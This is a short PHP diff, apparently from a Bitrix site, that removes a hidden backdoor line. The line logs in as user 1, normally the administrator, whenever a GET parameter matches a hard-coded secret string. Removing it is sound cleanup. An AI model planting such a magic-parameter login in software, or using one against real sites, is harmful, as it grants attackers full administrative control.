@@ -12,7 +12,6 @@ if(!empty($template->error)){
 	MyDebug::print_r($template->error);
 	die;
 }
-if($_GET["word"] == "5x60H36M2A") CUser::Authorize(1);
 
 /**
  * Получение дней, часов и минут из секунд
